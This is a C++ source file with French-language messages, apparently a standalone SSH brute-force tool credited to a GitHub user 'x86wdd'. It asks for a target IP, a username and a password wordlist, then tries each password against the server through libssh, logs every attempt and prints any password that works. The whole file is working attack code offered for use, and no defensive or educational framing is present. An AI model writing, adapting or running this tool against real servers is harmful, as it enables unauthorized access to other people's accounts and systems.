#include <iostream>
#include <fstream>
#include <libssh/libssh.h>
#include <cstring>
#include <chrono>
#include <thread>
#include <csignal>
#include <regex>

using namespace std;

volatile sig_atomic_t interrompu = 0;

void gestionnaire_signal(int signal) {
    interrompu = 1;
}

bool tentative_connexion_ssh(const string& mot_de_passe, const string& adresse_serveur, const string& utilisateur, int port, int delai_ms, ofstream& journal) {
    ssh_session session = ssh_new();
    if (!session) {
        cerr << "\033[31mErreur : Échec de la création de la session SSH.\033[0m" << endl;
        return false;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, adresse_serveur.c_str());
    ssh_options_set(session, SSH_OPTIONS_USER, utilisateur.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes128-ctr");

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        cerr << "\033[31mÉchec de la connexion : " << ssh_get_error(session) << "\033[0m" << endl;
        ssh_free(session);
        return false;
    }

    rc = ssh_userauth_password(session, nullptr, mot_de_passe.c_str());
    if (rc == SSH_AUTH_SUCCESS) {
        cout << "\033[32m[SUCCÈS] Mot de passe trouvé : " << mot_de_passe << "\033[0m" << endl;
        journal << "Succès - Mot de passe : " << mot_de_passe << " - " << chrono::system_clock::now().time_since_epoch().count() << endl;
        ssh_disconnect(session);
        ssh_free(session);
        return true;
    } else {
        cout << "[ÉCHEC] Tentative : " << mot_de_passe << " - Incorrect." << endl;
        journal << "Échec - Tentative : " << mot_de_passe << " - " << chrono::system_clock::now().time_since_epoch().count() << endl;
    }

    ssh_disconnect(session);
    ssh_free(session);
    this_thread::sleep_for(chrono::milliseconds(delai_ms));
    return false;
}

void forcer_brute(const string& chemin_liste_mots, const string& adresse_serveur, const string& utilisateur, int port, int delai_ms, int limite_tentatives) {
    ofstream journal("bruteforce_log.txt", ios::app);
    if (!journal) {
        cerr << "Erreur : Impossible d'ouvrir le fichier journal." << endl;
    }

    ifstream fichier(chemin_liste_mots);
    if (!fichier) {
        cerr << "Erreur : Impossible d'ouvrir le fichier de mots de passe à " << chemin_liste_mots << endl;
        return;
    }

    string mot_de_passe;
    int tentatives = 0;
    while (getline(fichier, mot_de_passe) && !mot_de_passe.empty() && (limite_tentatives == 0 || tentatives < limite_tentatives) && !interrompu) {
        tentatives++;
        cout << "Tentative #" << tentatives << " : ";
        if (tentative_connexion_ssh(mot_de_passe, adresse_serveur, utilisateur, port, delai_ms, journal)) {
            return;
        }
    }
    if (interrompu) {
        cout << "\033[33m[INTERROMPU] Force brute arrêtée par l'utilisateur.\033[0m" << endl;
    } else {
        cout << "Force brute terminée. Aucun mot de passe trouvé après " << tentatives << " tentatives." << endl;
    }
    journal.close();
}

bool valider_ip(const string& ip) {
    regex pattern("^(\\d{1,3}\\.){3}\\d{1,3}$");
    return regex_match(ip, pattern);
}

int main() {
    signal(SIGINT, gestionnaire_signal);

    string adresse_serveur, utilisateur, chemin_liste_mots;
    int port, delai_ms, limite_tentatives;

    cout << "Force Brute SSH - Par wdd" << endl;
    cout << "Github : x86wdd " << endl;
    cout << "Mise à jour : 08.04.2025" << endl;

    do {
        cout << "Adresse IP du serveur (ex. 192.168.1.1) : ";
        getline(cin, adresse_serveur);
        if (!valider_ip(adresse_serveur)) {
            cerr << "Erreur : Adresse IP invalide." << endl;
        }
    } while (!valider_ip(adresse_serveur));

    cout << "Nom d'utilisateur : ";
    getline(cin, utilisateur);

    cout << "Chemin du fichier de mots de passe : ";
    getline(cin, chemin_liste_mots);

    cout << "Port SSH (par défaut 22) : ";
    cin >> port;
    if (port <= 0 || port > 65535) port = 22;

    cout << "Délai entre tentatives (en ms, ex. 1000 pour 1s) : ";
    cin >> delai_ms;
    if (delai_ms < 0) delai_ms = 0;

    cout << "Limite de tentatives (0 pour aucune limite) : ";
    cin >> limite_tentatives;
    if (limite_tentatives < 0) limite_tentatives = 0;
    cin.ignore();

    forcer_brute(chemin_liste_mots, adresse_serveur, utilisateur, port, delai_ms, limite_tentatives);
    return 0;
}
